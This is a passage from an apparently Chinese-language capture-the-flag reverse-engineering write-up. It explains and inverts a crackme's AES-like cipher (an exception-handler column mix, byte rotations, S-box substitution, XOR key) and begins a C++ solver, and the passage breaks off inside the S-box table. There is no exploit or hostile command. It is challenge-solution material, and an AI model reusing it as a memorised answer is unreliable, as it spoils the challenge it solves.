fun(tt)<br>print(ans)<br><br></code></pre></td></tr></table></figure><ol start="3"><li><p>EXCEPTION_ACCESS_VIOLATION, 对输入矩阵进行 <code>AES 列混合</code> 并 <code>行混淆</code></p><p>逆运算就是 AES 逆列混合运算</p></li></ol><h2 id="main-函数中的变换"><a href="#main-函数中的变换" class="headerlink" title="main 函数中的变换"></a>main 函数中的变换</h2><ol><li>矩阵内元素循环左移</li></ol><p>矩阵内每个元素左移动</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">rol</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] )</span></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        a[i][<span class="hljs-number">0</span>] = __ROL1__(a[i][<span class="hljs-number">0</span>], i);<br>        a[i][<span class="hljs-number">1</span>] = __ROL1__(a[i][<span class="hljs-number">1</span>], i);<br>        a[i][<span class="hljs-number">2</span>] = __ROL1__(a[i][<span class="hljs-number">2</span>], i);<br>        a[i][<span class="hljs-number">3</span>] = __ROL1__(a[i][<span class="hljs-number">3</span>], i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>逆运算</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ror</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] )</span></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        a[i][<span class="hljs-number">0</span>] = __ROR1__(a[i][<span class="hljs-number">0</span>], i);<br>        a[i][<span class="hljs-number">1</span>] = __ROR1__(a[i][<span class="hljs-number">1</span>], i);<br>        a[i][<span class="hljs-number">2</span>] = __ROR1__(a[i][<span class="hljs-number">2</span>], i);<br>        a[i][<span class="hljs-number">3</span>] = __ROR1__(a[i][<span class="hljs-number">3</span>], i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li><p>AES S 盒置换</p><p>逆运算用 反S盒即可</p></li></ol><ol start="3"><li>XOR 密钥加运算</li></ol><p>矩阵中每个元素异或下面这个矩阵对应位置元素即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x61</span>, <span class="hljs-number">0</span>x<span class="hljs-number">64</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>x<span class="hljs-number">73</span>, <span class="hljs-number">0</span>x<span class="hljs-number">74</span>, <span class="hljs-number">0</span>x<span class="hljs-number">72</span>, <span class="hljs-number">0</span>x<span class="hljs-number">61</span>, <span class="hljs-number">0</span>x<span class="hljs-number">74</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">72</span>, <span class="hljs-number">0</span>x<span class="hljs-number">78</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">78</span><br></code></pre></td></tr></table></figure><h2 id="整体加密流程"><a href="#整体加密流程" class="headerlink" title="整体加密流程"></a>整体加密流程</h2><p>注意异常处理里面的每一种变换后都有一个行混淆</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>    <span class="hljs-number">1</span>. 字节内移位 rol ，逆运算 ror<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">2</span>. 轮密钥加密 xor <span class="hljs-number">0</span>x6E<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">3</span>. shift 行混淆<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">4</span>. aes S盒加密置换<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">5</span>. 矩阵乘法<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">6</span>. shift<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">7</span>. xor密钥运算 <br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">8</span>. 列混合<br><span class="hljs-regexp">//</span><br><span class="hljs-regexp">//</span>    <span class="hljs-number">9</span>. shift<br><br></code></pre></td></tr></table></figure><p>最后输出反推输入即可，注意每一种逆运算。</p><p>完整代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cctype&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ida.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * S盒</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> S[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x76</span>,<br>                               <span class="hljs-number">0xca</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xc0</span>,<br>                               <span class="hljs-number">0xb7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,<br>                               <span class="hljs-number">0x04</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x75</span>,<br>                               <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x84</span>,<br>                               <span class="hljs-number">0x53</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xcf</span>,<br>                               <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xa8</span>,<br>                               <span class="hljs-number">0x51</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd2</span>,<br>                               <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,<br>                               <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xdb</span>,<br>                               <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x79</span>,<br>                               <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x08</span>,<br>                               <span class="hljs-number">0xba</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8a</span>,<br>                               <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xf6</span>, <span 